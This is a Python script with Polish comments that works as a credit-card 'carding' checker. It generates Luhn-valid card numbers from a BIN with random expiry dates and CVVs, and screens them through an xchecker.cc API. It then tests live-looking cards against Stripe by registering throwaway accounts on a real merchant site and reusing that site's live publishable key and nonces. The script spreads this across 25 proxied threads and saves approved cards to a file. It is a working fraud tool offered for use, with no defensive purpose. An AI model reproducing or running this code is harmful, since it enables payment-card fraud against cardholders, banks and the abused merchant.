import random
import sys
from datetime import datetime
import threading
import requests
import bs4
import re
import urllib3

# Wyłączenie ostrzeżeń o niezaufanych certyfikatach SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Klasa ProxiedSession do obsługi sesji z proxy
class ProxiedSession(requests.Session):
    def __init__(self, proxy):
        super().__init__()
        self.proxy = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    def request(self, method, url, **kwargs):
        kwargs.setdefault("proxies", self.proxy)
        return super().request(method, url, **kwargs)

# Funkcje generowania kart kredytowych
def luhn_checksum(card_number: str) -> int:
    """Oblicza sumę kontrolną Luhna dla danego numeru karty."""
    digits = [int(d) for d in card_number]
    for i in range(len(digits) - 2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    return sum(digits) % 10

def generate_mastercard(bin_prefix: str) -> str:
    """Generuje poprawny numer karty MasterCard zgodny z algorytmem Luhna."""
    length = 16 - len(bin_prefix) - 1
    account_number = ''.join(str(random.randint(0, 9)) for _ in range(length))
    incomplete_card_number = bin_prefix + account_number
    for check_digit in range(10):
        if luhn_checksum(incomplete_card_number + str(check_digit)) == 0:
            return incomplete_card_number + str(check_digit)

def generate_expiry_date() -> str:
    """Generuje losową datę ważności (MM/YY) od 2026 roku w zakresie od 1 do 5 lat od teraz."""
    current_year = max(datetime.now().year % 100, 26)
    expiry_year = current_year + random.randint(1, 5)
    expiry_month = random.randint(1, 12)
    return f"{expiry_month:02d}/{expiry_year:02d}"

def generate_cvv() -> str:
    """Generuje losowy 3-cyfrowy kod CVV."""
    return f"{random.randint(100, 999)}"

# Funkcja sprawdzania karty w Xchecker
def check_with_xchecker(full_card, proxy):
    url = f"https://www.xchecker.cc/api.php?cc={full_card}"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
        "Accept": "*/*",
    }
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    try:
        response = requests.get(url, headers=headers, proxies=proxies, verify=False, allow_redirects=False)
        if response.status_code == 200 and "json" in response.headers.get("Content-Type", ""):
            data = response.json()
            return data
    except Exception as e:
        print(f"Wątek {threading.current_thread().name}: Błąd Xchecker: {e}")
    return "Error"

# Funkcja sprawdzania karty w Stripe
def check_with_stripe(full_card, session, proxy):
    cc, mm, yy, cvv = full_card.split("|")
    headers = {
        'authority': 'www.thetravelinstitute.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    try:
        response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers)
        nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response.text).group(1)

        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=data, proxies=session.proxy)
        res = response.json()
        if 'error' in res:
            return res
        pm_id = res['id']

        params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }
        response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data)
        res = response.json()
        print(res)
        return "Approved" if res['success'] or "Successful" in res else "Declined"
    except Exception as e:
        print(f"Wątek {threading.current_thread().name}: Błąd Stripe: {e}")
        return "Error"

# Funkcja tworzenia sesji dla Stripe
def create_session(proxy):
    session = ProxiedSession(proxy)
    email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8)) + "@gmail.com"
    headers = {
        'authority': 'www.thetravelinstitute.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    try:
        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        soup = bs4.BeautifulSoup(response.text, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
        data = {
            'afurd_field_nonce': nonce,
            'email': email,
            'password': 'Esahatam2009@',
            'woocommerce-register-nonce': noncee,
            'register': 'Register',
        }
        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            return session
    except Exception as e:
        print(f"Wątek {threading.current_thread().name}: Błąd tworzenia sesji: {e}")
    return None

# Funkcja robocza dla wątków
def worker(thread_index, proxy, bin_prefix, num_cards_per_thread, lock):
    global approved, declined, incorrect, xcheckerdeclined, checked, xcheckerpassed, xcheckedpassed
    session = create_session(proxy)
    if not session:
        print(f"Wątek {thread_index}: Nie udało się utworzyć sesji. Zakończono.")
        return

    for _ in range(num_cards_per_thread):
        card_number = generate_mastercard(bin_prefix)
        expiry = generate_expiry_date()
        mm, yy = expiry.split("/")
        cvv = generate_cvv()
        full_card = f"{card_number}|{mm}|{yy}|{cvv}"

        #print(full_card)
        xchecker_status = str(check_with_xchecker(full_card, proxy))
        #print(xchecker_status)
        #if xchecker_status == "Live":
        checked = checked+1
        update_status()
        if "Live" in xchecker_status:
            xcheckedpassed = xcheckedpassed + 1
            update_status()
            #print("Live")
            stripe_result = str(check_with_stripe(full_card, session, proxy))
            #print(stripe_result)
            #print(stripe_result)
            if "Approved" in stripe_result:
                with lock:
                    with open("output.txt", "a") as f:
                        f.write(full_card + "\n")
                approved = approved + 1
                update_status()
                print(f"Wątek {thread_index}: Zatwierdzono kartę: {full_card}")
            if "Declined" in stripe_result:
                declined = declined+1
                update_status()
        #     if "Incorrect" in stripe_result:
        #         incorrect = incorrect+1
        #         update_status()
        # if "Dead" in xchecker_status:
        #     xcheckerdeclined = xcheckerdeclined+1
        #     update_status()

checked = 0
xcheckedpassed = 0
xcheckerdeclined = 0
approved = 0
declined = 0
error = 0
incorrect = 0

lock = threading.Lock()
def update_status():
    global checked,xcheckerdeclined,xcheckedpassed,approved,declined,error,incorrect
    with lock:
        sys.stdout.write(f"\rChecked: {checked} | Approved: {approved} | Declined: {declined} | Live {xcheckedpassed}")
        sys.stdout.flush()


# Główna funkcja
def main():
    # Wczytanie proxy z pliku
    try:
        with open("proxies2.txt", "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        if not proxies:
            raise ValueError("Plik proxies2.txt jest pusty.")
    except FileNotFoundError:
        print("Błąd: Plik proxies2.txt nie istnieje.")
        return

    bin_prefix = "403163"  # Przykładowy BIN
    num_threads = 25
    num_cards_per_thread = 1000000  # Liczba kart do sprawdzenia na wątek
    lock = threading.Lock()

    threads = []
    for i in range(num_threads):
        proxy = proxies[i % len(proxies)]
        t = threading.Thread(target=worker, args=(i, proxy, bin_prefix, num_cards_per_thread, lock))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("Wszystkie wątki zakończyły działanie. Wyniki zapisano w output.txt.")

if __name__ == "__main__":
    main()